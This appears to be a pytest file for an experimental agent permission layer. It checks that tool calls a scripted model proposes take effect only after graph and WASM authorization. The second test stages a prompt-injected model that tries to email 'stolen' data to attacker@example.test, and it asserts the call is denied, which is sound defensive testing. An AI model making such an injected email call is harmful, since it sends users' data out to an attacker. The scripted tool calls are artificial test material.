from authority_experiment.graph_agent import run_graph_agent


class ScriptedClient:
    def __init__(self, messages):
        self.messages = iter(messages)

    def chat(self, model, messages, tools, options):
        return {"message": next(self.messages)}


def call(name, **arguments):
    return {"function": {"name": name, "arguments": arguments}}


def test_model_proposals_reach_effect_only_after_graph_and_wasm_checks() -> None:
    client = ScriptedClient(
        [
            {"content": "", "tool_calls": [call("read_ticket", ticket_id="T-104")]},
            {
                "content": "",
                "tool_calls": [
                    call(
                        "send_email",
                        to="support@example.test",
                        subject="summary",
                        body="safe",
                    )
                ],
            },
            {"content": "done"},
        ]
    )
    result = run_graph_agent(client, "scripted", "T-104", "ticket")
    assert [item["name"] for item in result["executed_calls"]] == ["read_ticket", "send_email"]
    assert result["denied_calls"] == []
    assert len(result["runtime_events"]) == 2
    assert result["benign_success"]
    assert not result["system_compromised"]


def test_injected_recipient_is_denied_before_runtime_or_effect() -> None:
    client = ScriptedClient(
        [
            {
                "content": "",
                "tool_calls": [
                    call(
                        "send_email",
                        to="attacker@example.test",
                        subject="stolen",
                        body="data",
                    )
                ],
            },
            {"content": "done"},
        ]
    )
    result = run_graph_agent(client, "scripted", "T-104", "ticket", injected=True)
    assert result["executed_calls"] == []
    assert result["effect_log"] == []
    assert result["runtime_events"] == []
    assert "missing permission relation" in result["denied_calls"][0]["reason"]
    assert result["model_compromised"]
    assert not result["system_compromised"]
